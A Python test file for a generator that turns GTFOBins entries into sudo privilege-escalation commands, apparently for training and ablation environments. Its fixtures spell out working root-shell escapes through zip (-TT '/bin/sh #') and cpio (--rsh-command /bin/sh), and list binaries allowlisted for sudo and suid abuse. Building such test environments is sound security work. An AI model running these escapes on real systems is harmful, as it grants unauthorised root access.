from src.generators.extract_gtfobins import (
    collect_generator_gtfobins_allowlist,
    extract_shell_exploit,
)


def test_extract_shell_exploit_normalizes_zip_temp_path_for_sudo() -> None:
    data = {
        "functions": {
            "shell": [
                {
                    "code": "zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'",
                    "contexts": {"sudo": {}},
                }
            ]
        }
    }

    exploits = extract_shell_exploit("zip", data, "sudo")

    assert exploits == [
        {
            "name": "zip",
            "binary_path": "/usr/bin/zip",
            "exploit_cmd": "sudo /usr/bin/zip /tmp/hosts.zip /etc/hosts -T -TT '/bin/sh #'",
        }
    ]


def test_extract_shell_exploit_normalizes_cpio_for_sudo() -> None:
    data = {
        "functions": {
            "shell": [
                {
                    "code": "echo '/bin/sh </dev/tty >/dev/tty' >localhost\ncpio -o --rsh-command /bin/sh -F localhost:",
                    "contexts": {"sudo": {}},
                }
            ]
        }
    }

    exploits = extract_shell_exploit("cpio", data, "sudo")

    assert exploits == [
        {
            "name": "cpio",
            "binary_path": "/usr/bin/cpio",
            "exploit_cmd": "cd /tmp && echo '/bin/sh </dev/tty >/dev/tty' >localhost && sudo /usr/bin/cpio -o --rsh-command /bin/sh -F localhost:",
        }
    ]


def test_collect_generator_gtfobins_allowlist_uses_all_config_sets(tmp_path) -> None:
    (tmp_path / "training").mkdir()
    (tmp_path / "ablation").mkdir()
    (tmp_path / "training" / "sudo_gtfobins.yaml").write_text(
        "sudo_allowlist:\n  - bash\n  - php\n"
    )
    (tmp_path / "training" / "suid_gtfobins.yaml").write_text(
        "suid_allowlist:\n  - node\n"
    )
    (tmp_path / "ablation" / "sudo_gtfobins.yaml").write_text(
        "sudo_allowlist:\n  - rsync\n"
    )

    allowlist = collect_generator_gtfobins_allowlist(tmp_path)

    assert allowlist == {"bash", "node", "php", "rsync"}
